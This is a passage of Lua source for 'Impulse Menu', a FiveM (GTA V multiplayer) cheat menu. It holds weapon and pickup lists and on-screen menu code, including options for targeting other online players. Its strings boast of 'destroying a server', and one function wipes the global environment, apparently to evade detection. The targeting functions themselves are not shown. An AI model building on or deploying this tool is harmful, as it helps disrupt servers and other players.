K2_CAMO_02","COMPONENT_HEAVYSNIPER_MK2_CAMO_02","COMPONENT_COMBATMG_MK2_CAMO_02","COMPONENT_PISTOL_MK2_CAMO_03","COMPONENT_SNSPISTOL_MK2_CAMO_03","COMPONENT_HEAVYSNIPER_MK2_CAMO_03","COMPONENT_CARBINERIFLE_MK2_CAMO_03","COMPONENT_SMG_MK2_CAMO_03","COMPONENT_COMBATMG_MK2_CAMO_03","COMPONENT_ASSAULTRIFLE_MK2_CAMO_03","COMPONENT_PISTOL_MK2_CAMO_04","COMPONENT_SNSPISTOL_MK2_CAMO_04","COMPONENT_CARBINERIFLE_MK2_CAMO_04","COMPONENT_SMG_MK2_CAMO_04","COMPONENT_COMBATMG_MK2_CAMO_04","COMPONENT_HEAVYSNIPER_MK2_CAMO_04","COMPONENT_ASSAULTRIFLE_MK2_CAMO_04","COMPONENT_PISTOL_MK2_CAMO_05","COMPONENT_SNSPISTOL_MK2_CAMO_05","COMPONENT_SMG_MK2_CAMO_05","COMPONENT_CARBINERIFLE_MK2_CAMO_05","COMPONENT_HEAVYSNIPER_MK2_CAMO_05","COMPONENT_ASSAULTRIFLE_MK2_CAMO_05","COMPONENT_COMBATMG_MK2_CAMO_05","COMPONENT_PISTOL_MK2_CAMO_06","COMPONENT_SNSPISTOL_MK2_CAMO_06","COMPONENT_ASSAULTRIFLE_MK2_CAMO_06","COMPONENT_HEAVYSNIPER_MK2_CAMO_06","COMPONENT_SMG_MK2_CAMO_06","COMPONENT_CARBINERIFLE_MK2_CAMO_06","COMPONENT_COMBATMG_MK2_CAMO_06","COMPONENT_PISTOL_MK2_CAMO_07","COMPONENT_SNSPISTOL_MK2_CAMO_07","COMPONENT_CARBINERIFLE_MK2_CAMO_07","COMPONENT_ASSAULTRIFLE_MK2_CAMO_07","COMPONENT_COMBATMG_MK2_CAMO_07","COMPONENT_HEAVYSNIPER_MK2_CAMO_07","COMPONENT_SMG_MK2_CAMO_07","COMPONENT_CARBINERIFLE_MK2_CAMO_08","COMPONENT_PISTOL_MK2_CAMO_08","COMPONENT_SNSPISTOL_MK2_CAMO_08","COMPONENT_COMBATMG_MK2_CAMO_08","COMPONENT_HEAVYSNIPER_MK2_CAMO_08","COMPONENT_SMG_MK2_CAMO_08","COMPONENT_ASSAULTRIFLE_MK2_CAMO_08","COMPONENT_PISTOL_MK2_CAMO_09","COMPONENT_SNSPISTOL_MK2_CAMO_09","COMPONENT_COMBATMG_MK2_CAMO_09","COMPONENT_CARBINERIFLE_MK2_CAMO_09","COMPONENT_ASSAULTRIFLE_MK2_CAMO_09","COMPONENT_HEAVYSNIPER_MK2_CAMO_09","COMPONENT_SMG_MK2_CAMO_09","COMPONENT_PISTOL_MK2_CAMO_10","COMPONENT_SNSPISTOL_MK2_CAMO_10","COMPONENT_ASSAULTRIFLE_MK2_CAMO_10","COMPONENT_HEAVYSNIPER_MK2_CAMO_10","COMPONENT_COMBATMG_MK2_CAMO_10","COMPONENT_CARBINERIFLE_MK2_CAMO_10","COMPONENT_SMG_MK2_CAMO_10","COMPONENT_PISTOL_MK2_CAMO_IND_01","COMPONENT_SMG_MK2_CAMO_IND_01","COMPONENT_ASSAULTRIFLE_MK2_CAMO_IND_01","COMPONENT_CARBINERIFLE_MK2_CAMO_IND_01","COMPONENT_COMBATMG_MK2_CAMO_IND_01","COMPONENT_HEAVYSNIPER_MK2_CAMO_IND_01","COMPONENT_SNSPISTOL_MK2_CAMO_IND_01"},
        AllWeapons = {"WEAPON_UNARMED", "WEAPON_KNIFE", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE", "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_MINISMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG", "WEAPON_RAYPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_PUMPSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_STINGER", "WEAPON_FIREWORK", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE", "WEAPON_MINIGUN", "WEAPON_RAILGUN", "WEAPON_POOLCUE", "WEAPON_BZGAS", "WEAPON_SMOKEGRENADE", "WEAPON_MOLOTOV", "WEAPON_FIREEXTINGUISHER", "WEAPON_PETROLCAN", "WEAPON_SNOWBALL", "WEAPON_FLARE", "WEAPON_BALL"},
        Pickups = {"PICKUP_AMMO_BULLET_MP","PICKUP_AMMO_FIREWORK","PICKUP_AMMO_FIREWORK_MP","PICKUP_AMMO_FLAREGUN","PICKUP_AMMO_GRENADELAUNCHER","PICKUP_AMMO_GRENADELAUNCHER_MP","PICKUP_AMMO_HOMINGLAUNCHER","PICKUP_AMMO_MG","PICKUP_AMMO_MINIGUN","PICKUP_AMMO_MISSILE_MP","PICKUP_AMMO_PISTOL","PICKUP_AMMO_RIFLE","PICKUP_AMMO_RPG","PICKUP_AMMO_SHOTGUN","PICKUP_AMMO_SMG","PICKUP_AMMO_SNIPER","PICKUP_ARMOUR_STANDARD","PICKUP_CAMERA","PICKUP_CUSTOM_SCRIPT","PICKUP_GANG_ATTACK_MONEY","PICKUP_HANDCUFF_KEY","PICKUP_HEALTH_SNACK","PICKUP_HEALTH_STANDARD","PICKUP_MONEY_CASE","PICKUP_MONEY_DEP_BAG","PICKUP_MONEY_MED_BAG","PICKUP_MONEY_PAPER_BAG","PICKUP_MONEY_PURSE","PICKUP_MONEY_SECURITY_CASE","PICKUP_MONEY_VARIABLE","PICKUP_MONEY_WALLET","PICKUP_PARACHUTE","PICKUP_PORTABLE_CRATE_UNFIXED","PICKUP_PORTABLE_CRATE_UNFIXED_INCAR","PICKUP_PORTABLE_DLC_VEHICLE_PACKAGE","PICKUP_PORTABLE_PACKAGE","PICKUP_SUBMARINE","PICKUP_VEHICLE_ARMOUR_STANDARD","PICKUP_VEHICLE_CUSTOM_SCRIPT","PICKUP_VEHICLE_HEALTH_STANDARD","PICKUP_VEHICLE_MONEY_VARIABLE","PICKUP_VEHICLE_WEAPON_APPISTOL","PICKUP_VEHICLE_WEAPON_ASSAULTSMG","PICKUP_VEHICLE_WEAPON_COMBATPISTOL","PICKUP_VEHICLE_WEAPON_GRENADE","PICKUP_VEHICLE_WEAPON_MICROSMG","PICKUP_VEHICLE_WEAPON_MOLOTOV","PICKUP_VEHICLE_WEAPON_PISTOL","PICKUP_VEHICLE_WEAPON_PISTOL50","PICKUP_VEHICLE_WEAPON_SAWNOFF","PICKUP_VEHICLE_WEAPON_SMG","PICKUP_VEHICLE_WEAPON_SMOKEGRENADE","PICKUP_VEHICLE_WEAPON_STICKYBOMB","PICKUP_WEAPON_ADVANCEDRIFLE","PICKUP_WEAPON_APPISTOL","PICKUP_WEAPON_ASSAULTRIFLE","PICKUP_WEAPON_ASSAULTSHOTGUN","PICKUP_WEAPON_ASSAULTSMG","PICKUP_WEAPON_BAT","PICKUP_WEAPON_BOTTL","PICKUP_WEAPON_BULLPUPRIFLE","PICKUP_WEAPON_BULLPUPSHOTGUN","PICKUP_WEAPON_CARBINERIFLE","PICKUP_WEAPON_COMBATMG","PICKUP_WEAPON_COMBATPDW","PICKUP_WEAPON_COMBATPISTOL","PICKUP_WEAPON_CROWBAR","PICKUP_WEAPON_DAGGER","PICKUP_WEAPON_FIREEXTINGUISHER","PICKUP_WEAPON_FIREWORK","PICKUP_WEAPON_FLAREGUN","PICKUP_WEAPON_GRENADE","PICKUP_WEAPON_GRENADELAUNCHER","PICKUP_WEAPON_GUSENBERG","PICKUP_WEAPON_GolfClub","PICKUP_WEAPON_HAMMER","PICKUP_WEAPON_HEAVYPISTOL","PICKUP_WEAPON_HEAVYSHOTGUN","PICKUP_WEAPON_HEAVYSNIPER","PICKUP_WEAPON_HOMINGLAUNCHER","PICKUP_WEAPON_KNIFE","PICKUP_WEAPON_KNUCKLE","PICKUP_WEAPON_MARKSMANPISTOL","PICKUP_WEAPON_MARKSMANRIFLE","PICKUP_WEAPON_MG","PICKUP_WEAPON_MICROSMG","PICKUP_WEAPON_MINIGUN","PICKUP_WEAPON_MOLOTOV","PICKUP_WEAPON_MUSKET","PICKUP_WEAPON_NIGHTSTIC","PICKUP_WEAPON_PETROLCAN","PICKUP_WEAPON_PISTOL","PICKUP_WEAPON_PISTOL50","PICKUP_WEAPON_PROXMINE","PICKUP_WEAPON_PUMPSHOTGUN","PICKUP_WEAPON_RPG","PICKUP_WEAPON_SAWNOFFSHOTGUN","PICKUP_WEAPON_SMG","PICKUP_WEAPON_SMOKEGRENADE","PICKUP_WEAPON_SNIPERRIFLE","PICKUP_WEAPON_SNSPISTOL","PICKUP_WEAPON_SPECIALCARBINE","PICKUP_WEAPON_STICKYBOMB","PICKUP_WEAPON_STUNGUN","PICKUP_WEAPON_VINTAGEPISTOL"},
        Weathers = {"CLEAR" , "EXTRASUNNY",  "CLOUDS" , "OVERCAST" , "RAIN" , "CLEARING" , "THUNDER" , "SMOG" , "FOGGY" , "XMAS" , "SNOWLIGHT" , "BLIZZARD"},
        Visuals = {"tunnel","CS3_rail_tunnel","MP_lowgarage","rply_vignette_neg","rply_saturation_neg","rply_saturation","yell_tunnel_nodirect",""},
        SelectedPlayers = {},
        Notifications = {},
    }


    function Impulse:Debug(msg)
        if self.DebugMode then
            print("[^1Impulse^0] [^4Debug^0] "..msg)
        end
    end

    function Impulse:BypassGlobalEnv()
        for k,v in pairs(_G) do
            _G[k] = nil
        end
    end

    function Impulse:DrawSprite(x, y, w, h, heading, dict, name, r, g, b, a, custom)
		if not HasStreamedTextureDictLoaded(dict) then
			RequestStreamedTextureDict(dict)
		end

		DrawSprite(dict, name, x, y, w , h, heading, r, g, b, a)
	end

    function Impulse:DrawText(text, font, centered, x, y, scale, r, g, b, a)
        text = tostring(text)
		SetTextFont(font)
		SetTextScale(scale, scale)
		SetTextCentre(centered)
	    SetTextColour(r, g, b, a)
        SetTextOutline()
        SetTextDropShadow()
		BeginTextCommandDisplayText("STRING")
		AddTextComponentSubstringPlayerName(text)
		EndTextCommandDisplayText(x/self.ScreenW, y/self.ScreenH)
	end

    function Impulse.DrawText2(text, font, centered, x, y, scale, r, g, b, a)
		SetTextFont(font)
		SetTextScale(scale, scale)
		SetTextCentre(centered)
	    SetTextColour(r, g, b, a)
        SetTextOutline()
        SetTextDropShadow()
		BeginTextCommandDisplayText("STRING")
		AddTextComponentSubstringPlayerName(text)
		EndTextCommandDisplayText(x,y)
	end

    function Impulse:DisableCameraMovement()
		DisableControlAction(0,1,1)
		DisableControlAction(0,18,1)
		DisableControlAction(0,69,1)
		DisableControlAction(0,92,1)
		DisableControlAction(0,106,1)
		DisableControlAction(0,122,1)
		DisableControlAction(0,257,1)
		DisableControlAction(0,2,1)
		DisableControlAction(0,3,1)
		DisableControlAction(0,4,1)
		DisableControlAction(0,5,1)
		DisableControlAction(0,6,1)
		DisableControlAction(0,24,1)
	end

    function Impulse:DrawWaterMark()
        local prevframes, prevtime, curtime, curframes, fps = 0, 0, 0, 0, 0
        if self.DrawWaterMark then
            CreateThread(function()
                while self.DrawWaterMark do
                    Wait(120)
                    curtime = GetGameTimer()
                    curframes = GetFrameCount()
                    if (curtime - prevtime) > 1000 then
                        fps = (curframes - prevframes) - 1
                        prevtime = curtime
                        prevframes = curframes
                    end
                end
            end)
            CreateThread(function()
                while self.DrawWaterMark do
                    Wait(0)
                    self:DrawText("~w~FPS~s~: ~w~" .. fps .." ~s~| ~w~ Absolute Menu ~s~ | ~w~ " ..GetCurrentServerEndpoint(), 4, true,self.ScreenW *0.4, self.ScreenH * 0.95, 0.32,self.MenuR,self.MenuG,self.MenuB, 255)
                    self:DrawRectangle(self.ScreenW * 0.4, self.ScreenH * 0.95, 250, 30, 31, 31,31, 200)
                    self:DrawRectangle(self.ScreenW *0.4, self.ScreenH * 0.95, 250, 30, 31, 31,31, 200)
                    self:DrawRectangle(self.ScreenW *0.4, self.ScreenH * 0.945, 250, 3,self.MenuR,self.MenuG,self.MenuB, 200)
                end
            end)
        end
    end

    function Impulse.KeyboardInput(TextEntry, ExampleText, MaxStringLenght)
        MaxStringLenght = MaxStringLenght or 30
        ExampleText = ExampleText or ""
        TextEntry = TextEntry or "Impulse Input:"
        AddTextEntry('FMMC_KEY_TIP1', TextEntry)
        DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLenght)
        local blockinput = true

        while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
            Citizen.Wait(0)
        end
            
        if UpdateOnscreenKeyboard() ~= 2 then
            local result = GetOnscreenKeyboardResult()
            Citizen.Wait(500)
            blockinput = false
            return result
        else
            Citizen.Wait(500)
            blockinput = false
            return ""
        end
        
    end

    function Impulse:SetRichPresence()
        SetDiscordAppId(835851070223548426)
        SetDiscordRichPresenceAsset('logo')
        SetDiscordRichPresenceAssetText("discord.gg/ujb8sFSTuk")
        SetRichPresence(GetPlayerName(PlayerId()).." is destroying a server with Impulse Menu")
    end

    function Impulse:isHover(x, y, w, h)
		if self.MouseX >= x and self.MouseX <= x + w and self.MouseY >= y and self.MouseY <= y + h then
            return true
		else
			return false
		end
	end

    function Impulse:DrawRectangle(x, y, w, h, r, g, b, a)
        local rectw, recth = w / Impulse.ScreenW, h / Impulse.ScreenH
        local rectx, recty = x / Impulse.ScreenW + rectw / 2, y / Impulse.ScreenH + recth / 2
        return DrawRect(rectx, recty, rectw, recth, r, g, b, a)
    end

    function Impulse.DrawRectangle2(x, y, w, h, r, g, b, a)
        local rectw, recth = w / Impulse.ScreenW, h / Impulse.ScreenH
        local rectx, recty = x / Impulse.ScreenW + rectw / 2, y / Impulse.ScreenH + recth / 2
        return DrawRect(rectx, recty, rectw, recth, r, g, b, a)
    end

    function Impulse:ChooseKey()
        SetMouseCursorActiveThisFrame()
        SetMouseCursorSprite(8)
        self:DisableCameraMovement()

        self:DrawText("PRESS A KEY TO OPEN IMPULSE",4,false,self.ScreenW*0.5,self.ScreenH*0.5, 0.5,255,255,255,255)
        self:DrawRectangle(self.ScreenW*0.5,self.ScreenH*0.5, self.ScreenW*self.RectWidth*1.5, self.ScreenH*0.035, 255, 0, 0, 225)
        self:DrawText("START TO DESTROY",4,false,self.ScreenW*0.5,self.ScreenH*0.5+(self.ScreenH*-0.035), 0.5,255,255,255,255)
        self:DrawRectangle(self.ScreenW*0.5,self.ScreenH*0.5, self.ScreenW*self.RectWidth*1.5, self.ScreenH*-0.035, 255, 200, 100, 200)

        self:DrawText(self.OpenKey or "NOTHING",4,false,self.ScreenW*0.5,self.ScreenH*0.5+(self.ScreenH*0.035), 0.5,255,255,255,255)
        self:DrawRectangle(self.ScreenW*0.5,self.ScreenH*0.5+(self.ScreenH*0.035), self.ScreenW*self.RectWidth*1.5, self.ScreenH*0.045, 0, 0, 0, 220)

        for k,v in pairs(self.Keys) do
            if IsDisabledControlPressed(0,v) and not Impulse:isHover(self.ScreenW*0.5,self.ScreenH*0.5+(self.ScreenH*-0.035),self.ScreenW*self.RectWidth*1.5,self.ScreenH*0.035) then
                self.OpenKey = k
            end
        end

        if Impulse:isHover(self.ScreenW*0.5,self.ScreenH*0.5+(self.ScreenH*-0.035),self.ScreenW*self.RectWidth*1.5,self.ScreenH*0.035) and (self.IsClicking or self.IsEnterPressed) then self.Initialized = true
            Impulse:PushNotification("Welcome on Impulse Menu !")
        end
	end

    function Impulse:PushNotification(msg)
        local c = #self.Notifications+1
        PlaySoundFrontend(-1, "DELETE", "HUD_DEATHMATCH_SOUNDSET", false)
        self.Notifications[c] = msg
        CreateThread(function()
            Wait(8000)
            table.remove(self.Notifications, 1)
        end)
    end

    function Impulse:DrawNotifications()
        
        local nAlpha = 0

        if self.Showing then nAlpha = 220 else nAlpha = 0 end

        if self.NotifActive then
            self:DrawText(" -   NOTIFICATIONS", 4, false, self.NotifX, self.NotifY, 0.35, 255, 255, 255, nAlpha)
            if #self.Notifications <= 0 then
                self:DrawText("You don't have any notifications.", 4, false, self.NotifX + 0.5, self.NotifY + 34, 0.35, 255, 255, 255, nAlpha)
            else
                for k, v in pairs(self.Notifications) do
                    self:DrawText(v, 4, false, self.NotifX + 0.5, self.NotifY + k*34, 0.35, 255, 255, 255, nAlpha)
                    self.NotifH = k * 34
                end
            end
        else
            self:DrawText(" +   NOTIFICATIONS", 4, false, self.NotifX, self.NotifY, 0.35, 255, 255, 255, nAlpha)
        end

        self:DrawRectangle(self.NotifX, self.NotifY, self.NotifW, self.ScreenH*0.03, self.MenuR, self.MenuG, self.MenuB, nAlpha)
        self:DrawText("MOVE", 4, false, self.NotifX, self.NotifY-25, 0.35, 255, 255, 255, nAlpha)
        self:DrawRectangle(self.NotifX, self.NotifY-26, self.NotifW/5, 32*0.8, 0, 0, 0, nAlpha-20)
        if self.NotifActive then
            self:DrawRectangle(self.NotifX, self.NotifY+30, self.NotifW, self.NotifH, 0, 0, 0, nAlpha-20)
        end

        if self.cooldown > 0 then 
            self.cooldown = self.cooldown - 1
        end

        if Impulse:isHover(self.NotifX, self.NotifY,18,28) and (self.IsClicking or self.IsEnterPressed) and not self.isDragging and self.cooldown == 0 then --si il clique sur le menu deroulant
            self.cooldown = 200
            self.NotifActive = not self.NotifActive
        elseif Impulse:isHover(self.NotifX, self.NotifY*0.915,18,28) and (self.IsClicking or self.IsEnterPressed) and not self.isDragging then -- si il reste appuyé sur le truc de merde
            CreateThread(function()
                self.isDragging = true
                while not IsDisabledControlJustReleased(0,24) do
                    SetMouseCursorSprite(4)

                    if self.MouseX < (0.98*self.ScreenW) and self.MouseX > (0.02*self.ScreenW) and (self.MouseY+20) < (0.98*self.ScreenH) and (self.MouseY+20) > (0.02*self.ScreenH) then
                        self.NotifX, self.NotifY = self.MouseX,self.MouseY+20
                    end
                    if IsDisabledControlJustReleased(0,24) then
                        break
                    end
                    Wait(0)
                end
                self.isDragging = false
            end)
        end
	end


    function Impulse:RGBMenu()
        Impulse.Options.RGBMenu = not Impulse.Options.RGBMenu
        if Impulse.Options.RGBMenu then
            CreateThread(function()
                while Impulse.Options.RGBMenu do
                    local curtime = GetGameTimer() / 1000
                
                    Impulse.MenuR = math.floor( math.sin( curtime * 7 + 0 ) * 127 + 128 )
                    Impulse.MenuG = math.floor( math.sin( curtime * 7 + 2 ) * 127 + 128 )
                    Impulse.MenuB = math.floor( math.sin( curtime * 7 + 4 ) * 127 + 128 )
                    Wait(0)
                end
            end)
        else
            Impulse.MenuR = 255
            Impulse.MenuB = 0
            Impulse.MenuB = 0
        end
    end

    function Impulse:Button(name,x,y,v)
        v.nb = v.nb + 1
        if Impulse:isHover(x,y+(v.nb*20),self.ScreenW*self.RectWidth,18) and not self.isDragging then
            if self.cooldown > 0 then 
                self.cooldown = self.cooldown - 1
            end
            self:DrawText(name,4,false,x,y+(v.nb*20), 0.3,self.MenuR,self.MenuG,self.MenuB,255)
            if (self.IsClicking or self.IsEnterPressed) and self.cooldown == 0 then
                self.cooldown = 200
                self:PushNotification("The function ["..name.."] has been executed successfully")
                return true
            end
        else
            self:DrawText(name,4,false,x,y+(v.nb*20), 0.3,255,255,255,255)
            return false
        end
    end

    function Impulse:CheckBox(name,x,y,v,id)
        v.nb = v.nb + 1
        if id.isChecked or false then
            self:DrawRectangle(x+(self.ScreenW*self.RectWidth*0.017),y+(v.nb*21),self.ScreenW*0.01,(self.ScreenH*0.01)*(self.ScreenW/self.ScreenH),self.MenuR,self.MenuG,self.MenuB,250)
        else
            self:DrawRectangle(x+(self.ScreenW*self.RectWidth*0.017),y+(v.nb*21),self.ScreenW*0.01,(self.ScreenH*0.01)*(self.ScreenW/self.ScreenH),255,255,255,150)
        end
        if Impulse:isHover(x,y+(v.nb*21),self.ScreenW*self.RectWidth,18) and not self.isDragging then
            if self.cooldown > 0 then 
                self.cooldown = self.cooldown - 1
            end
            self:DrawText(name,4,false,x+self.ScreenW*0.015,y+(v.nb*21), 0.3,self.MenuR,self.MenuG,self.MenuB,255)
            if (self.IsClicking or self.IsEnterPressed) and self.cooldown == 0 then
                self.cooldown = 200
                self:PushNotification("The function ["..name.."] has been executed successfully")
                id.isChecked = not id.isChecked
                return true
            end
        else
            self:DrawText(name,4,false,x+self.ScreenW*0.015,y+(v.nb*21), 0.3,255,255,255,255)
            return false
        end
    end

    function Impulse:GetTextWidth(str, font, scale)
        if not str then return 0.0 end
		font = font or 4
		scale = scale or 0.3
		BeginTextCommandWidth("STRING")
		AddTextComponentSubstringPlayerName(str)
		SetTextFont(font or 4)
		SetTextScale(scale or 0.35, scale or 0.35)
		local length = EndTextCommandGetWidth(1)
		return length * self.ScreenW
	end

    function Impulse:Slider(name,list,x,y,v,yy)
        v.nb = v.nb + 1

        if Impulse:isHover(x+self:GetTextWidth(name..":←  "),y+(v.nb*20),self:GetTextWidth(list[yy.current]),18) and not self.isDragging then --right
            if self.cooldown > 0 then 
                self.cooldown = self.cooldown - 1
            end
            self:DrawText(list[yy.current]:upper(),4,false,x+self:GetTextWidth(name..":←  "),y+(v.nb*20), 0.3,self.MenuR,self.MenuG,self.MenuB,255)

            if (self.IsClicking or self.IsEnterPressed) and self.cooldown == 0 then
                self.cooldown = 200
                self:PushNotification("The function ["..list[yy.current].."] has been executed successfully")
                return true,list[yy.current]
            end
        else
            self:DrawText(list[yy.current]:upper(),4,false,x+self:GetTextWidth(name..":←  "),y+(v.nb*20), 0.3,255,255,255,255)
        end

        self:DrawText(name..":",4,false,x,y+(v.nb*20), 0.3,255,255,255,255)
        if Impulse:isHover(x+self:GetTextWidth(name..":"),y+(v.nb*20),(self.ScreenW*self.RectWidth)/20,18) and not self.isDragging then --left
            if self.cooldown > 0 then 
                self.cooldown = self.cooldown - 1
            end
            self:DrawText("←  ",0,false,x+self:GetTextWidth(name..":"),y+(v.nb*20), 0.25,self.MenuR,self.MenuG,self.MenuB,255)

            if (self.IsClicking or self.IsEnterPressed) and self.cooldown == 0 then
                if yy.current == 1 then
                    yy.current = #list
                else
                    yy.current = yy.current - 1
                end
                self.cooldown = 200
            end
        else
            self:DrawText("←  ",0,false,x+self:GetTextWidth(name..":"),y+(v.nb*20), 0.25,255,255,255,255)
        end
        if Impulse:isHover(x+self:GetTextWidth(name..":←  "..list[yy.current].."  "),y+(v.nb*20),(self.ScreenW*self.RectWidth)/20,18) and not self.isDragging then --right
            if self.cooldown > 0 then 
                self.cooldown = self.cooldown - 1
            end
            self:DrawText(" →",0,false,x+self:GetTextWidth(name..":←  "..list[yy.current].."  "),y+(v.nb*20), 0.25,self.MenuR,self.MenuG,self.MenuB,255)

            if (self.IsClicking or self.IsEnterPressed) and self.cooldown == 0 then
                if yy.current == #list then
                    yy.current = 1
                else
                    yy.current = yy.current + 1
                end
                self.cooldown = 200
            end
        else
            self:DrawText(" →",0,false,x+self:GetTextWidth(name..":←  "..list[yy.current].."  "),y+(v.nb*20), 0.25,255,255,255,255)
        end
        return false,nil
    end

    function Impulse:DrawMenu()
		if self.Showing then

            SetMouseCursorActiveThisFrame()
			SetMouseCursorSprite(8)
            self:DisableCameraMovement()

            for k,v in pairs(self.Categories) do
                local X_,Y_ = v.x*self.ScreenW,v.y*self.ScreenH
                if self.cooldown > 0 then 
                    self.cooldown = self.cooldown - 1
                end
                if Impulse:isHover(X_,Y_,18,28) and (self.IsClicking or self.IsEnterPressed) and not self.isDragging and self.cooldown == 0 then --si il clique sur le menu deroulant
                    self.cooldown = 200
                    v.show = not v.show
                elseif Impulse:isHover(X_,Y_-20,50,20) and (self.IsClicking or self.IsEnterPressed) and not self.isDragging then -- si il reste appuyé sur le truc de merde
                    CreateThread(function()
                        self.isDragging = true
                        while not IsDisabledControlJustReleased(0,24) do
                            SetMouseCursorSprite(4)

                            if self.MouseX < (0.98*self.ScreenW) and self.MouseX > (0.02*self.ScreenW) and (self.MouseY+20) < (0.98*self.ScreenH) and (self.MouseY+20) > (0.02*self.ScreenH) then
                                v.x = self.MouseX/self.ScreenW
                                v.y = (self.MouseY+20)/self.ScreenH
                            end
                            if IsDisabledControlJustReleased(0,24) then
                                break
                            end
                            Wait(0)
                        end
                        self.isDragging = false
                    end)
                end

                if not v.show then
                    self:DrawText(" +",4,false,X_,Y_, 0.4,255,255,255,255)
                elseif v.show then
                    self:DrawText(" -",4,false,X_,Y_, 0.4,255,255,255,255)
                    self:DrawRectangle(X_, Y_, self.ScreenW*self.RectWidth, (self.ScreenH*0.03) + 13 + ((self.Counter[k].checkbox+(math.floor((self.Counter[k].checkbox/5)+1))) * ((self.ScreenH*0.01)*(self.ScreenW/self.ScreenH))) + (self.Counter[k].buttons*20) + (self.Counter[k].slides*20), 0, 0, 0, 220)
                    v.nb = 1

                    if k == "ONLINE OPTIONS" then
                        if self:CheckBox("ALL PLAYERS",X_,Y_,self.Categories["ONLINE OPTIONS"],self.Categories["ONLINE OPTIONS"].Buttons[1]) then
                            self["AllPlayers"]()
                        end

                        local ca = 0
                        for i = 1,#v.Buttons,1 do
                            if v.Buttons[i].name ~= "ALL PLAYERS" then
                                ca = (ca or 0) + 1
                                if self:CheckBox(v.Buttons[i].name,X_,Y_,self.Categories["ONLINE OPTIONS"],self.Categories["ONLINE OPTIONS"].Buttons[ca+1]) then
                                    self["AddPlayerToSelection"](v.Buttons[i].func)
                                end
                            end
                        end
                    elseif k == "SELECTED PLAYERS" then
                        if self:Button("SELECTED "..#self.SelectedPlayers.." PLAYERS",X_,Y_,{nb = 1}) then return end
                        for i = 1,#v.Buttons,1 do
                            if i < 2 then
                                v.nb = v.nb + 1
                            end
                            if v.Buttons[i].type == "Button" then
                                if self:Button(v.Buttons[i].name:upper(),X_,Y_,v) then
                                    self[v.Buttons[i].func]()
                                end
                            elseif v.Buttons[i].type == "CheckBox" then
                                if self:CheckBox(v.Buttons[i].name:upper(),X_,Y_,v) then
                                    self[v.Buttons[i].func]()
                                end
                            elseif v.Buttons[i].type == "Slide" then
                                local click,slide = self:Slider(v.Buttons[i].name:upper(),v.Buttons[i].list,X_,Y_,v,v.Buttons[i])
                                if click then
                                    if v.Buttons[i].func ~= "" and slide ~= nil then
                                        self[v.Buttons[i].func](slide)
                                    end
                                end
                            end
                        end
                    else
                        for i = 1,#v.Buttons,1 do
                            if v.Buttons[i].type == "Button" then
                                if self:Button(v.Buttons[i].name:upper(),X_,Y_,v,v.Buttons[i]) then
                                    if v.Buttons[i].func ~= "" then
                                        self[v.Buttons[i].func]()
                                    end
                                end
                            elseif v.Buttons[i].type == "CheckBox" then
                                if self:CheckBox(v.Buttons[i].name:upper(),X_,Y_,v,v.Buttons[i]) then
                                    if v.Buttons[i].func ~= "" then
                                        self[v.Buttons[i].func]()
                                    end
                                end
                            elseif v.Buttons[i].type == "Slide" then
                                local click,slide = self:Slider(v.Buttons[i].name:upper(),v.Buttons[i].list,X_,Y_,v,v.Buttons[i])
                                if click then
                                    if v.Buttons[i].func ~= "" and slide ~= nil then
                                        self[v.Buttons[i].func](slide)
                                    end
                                end
                            end
                        end
                    end
                end
                self:DrawText("     "..k,4,false,X_,Y_, 0.4,255,255,255,255)
                self:DrawRectangle(X_, Y_, self.ScreenW*self.RectWidth, self.ScreenH*0.03, self.MenuR,self.MenuG,self.MenuB, 220)

                --boutton move au dessus du fdp de menu
                self:DrawText("MOVE",4,false,X_+10,Y_-22, 0.3,255,255,255,255)
                self:DrawRectangle(X_, Y_, self.ScreenW*self.RectWidth/3, self.ScreenH*-0.02, 0, 0, 0, 200)

            end
        end
	end

    local function inTable(tbl, item)
        for key, value in pairs(tbl) do
            if value.func == item then return key end
        end
        return false
    end

    function Impulse.MenuStyle(color)
        if color == 'Red' then
            Impulse.MenuR,Impulse.MenuG,Impulse.MenuB = 255,0,0
        elseif color == "Green" then
            Impulse.MenuR,Impulse.MenuG,Impulse.MenuB = 0,255,0
        elseif color == 'Blue' then
            Impulse.MenuR,Impulse.MenuG,Impulse.MenuB = 0,0,255
        end
    end

    function Impulse:CountEachButtons()
        for k,v in pairs(self.Categories) do
            self.Counter[k] = {buttons = 0, checkbox = 0, slides = 0}
            for kk,vv in pairs(self.Categories[k].Buttons) do
                if vv.type == "Button" then
